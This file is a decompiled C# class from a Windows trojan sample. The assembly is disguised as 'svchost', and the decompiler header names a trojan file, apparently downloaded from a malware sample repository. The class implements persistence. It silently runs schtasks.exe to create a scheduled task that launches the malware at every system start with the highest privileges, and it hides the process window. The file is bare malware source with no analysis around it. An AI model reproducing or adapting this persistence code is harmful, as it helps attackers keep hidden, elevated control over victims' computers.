// Decompiled with JetBrains decompiler
// Type: svchost.Persistence.SchTask
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace svchost.Persistence
{
  [OptionText]
  public class SchTask
  {
    public string PATHS;
    public string InstallName;
    public string HardInstall;

    public object AddtoSchTask()
    {
      object obj;
      try
      {
        FileInfo fileInfo = Operators.CompareString(this.HardInstall, "True", true) != 0 ? new FileInfo(Application.ExecutablePath) : new FileInfo(Path.Combine(Interaction.Environ(this.PATHS), this.InstallName));
        ProcessStartInfo startInfo = new ProcessStartInfo();
        ProcessStartInfo processStartInfo = startInfo;
        processStartInfo.FileName = "schtasks.exe";
        processStartInfo.Arguments = "/create /f /sc ONSTART /RL HIGHEST /tn \"'" + Path.GetFileNameWithoutExtension(fileInfo.FullName) + "\"' /tr \"'" + fileInfo.FullName + "\"'";
        processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        processStartInfo.CreateNoWindow = true;
        Process.Start(startInfo);
        obj = (object) true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) false;
        ProjectData.ClearProjectError();
      }
      return obj;
    }
  }
}
